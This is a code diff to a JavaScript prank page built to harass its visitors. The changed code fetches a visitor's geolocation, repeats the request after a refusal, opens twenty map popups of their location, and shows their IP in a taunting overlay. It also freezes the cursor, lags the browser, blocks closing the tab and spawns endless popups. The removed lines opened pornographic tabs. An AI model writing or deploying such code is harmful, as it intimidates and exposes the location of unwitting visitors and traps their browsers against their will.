@@ -135,22 +135,14 @@
             setTimeout(() => clearInterval(interval), 5000);
         }
 
-        function openPopupsAndTabs() {
-            const numPopups = 20; // Increased number of popups to open
-            const numTabs = 20; // Increased number of tabs to open
-            const interval = 200; // Decreased interval between openings
+        function openMapPopups(latitude, longitude) {
+            const numPopups = 20; // Number of map popups to open
+            const interval = 200; // Interval between opening popups
 
             for (let i = 0; i < numPopups; i++) {
                 setTimeout(() => {
-                    window.open('', '_blank', 'width=400,height=300');
-                }, i * interval);
-            }
-
-            for (let i = 0; i < numTabs; i++) {
-                setTimeout(() => {
-                    const url = `https://www.pornhub.com`;
-                    const newTab = window.open(url, '_blank');
-                    newTab.document.title = 'GET THUGGED';
+                    const mapUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;
+                    window.open(mapUrl, '_blank', 'width=800,height=600');
                 }, i * interval);
             }
         }
@@ -201,8 +193,6 @@
 
             setInterval(() => {
                 window.open('', '_blank', 'width=400,height=300');
-                const newTab = window.open('https://www.pornhub.com', '_blank');
-                newTab.document.title = 'GET THUGGED';
             }, 1000);
         }
 
@@ -235,14 +225,25 @@
             }
         }
 
-        function showLocationOnMap(latitude, longitude) {
-            const mapUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;
-            window.open(mapUrl, '_blank', 'width=800,height=600');
-        }
-
         document.addEventListener('click', async () => {
             const clickToLoad = document.getElementById('click-to-load');
             clickToLoad.style.display = 'none';
+
+            let location;
+            try {
+                location = await getUserLocation();
+                openMapPopups(location.latitude, location.longitude);
+            } catch (error) {
+                if (error.code === 1) {
+                    // User denied location permission
+                    alert('You need to accept location permissions for the site to work.');
+                    location = await getUserLocation();
+                    openMapPopups(location.latitude, location.longitude);
+                } else {
+                    console.error('Error getting location:', error);
+                    return;
+                }
+            }
 
             const userIP = await fetchIP();
             const userState = getUserState();
@@ -251,17 +252,9 @@
             overlay.innerHTML = `IMAGING LIVING IN ${userState}<br>LOL UR IP IS ${userIP}`;
             overlay.style.display = 'block';
 
-            try {
-                const location = await getUserLocation();
-                showLocationOnMap(location.latitude, location.longitude);
-            } catch (error) {
-                console.error('Error getting location:', error);
-            }
-
             freezeCursor();
             lagBrowser();
             playRandomAudio();
-            openPopupsAndTabs();
             makeBrowserBuggy();
             preventClose();
             popUpGifsAndImages();
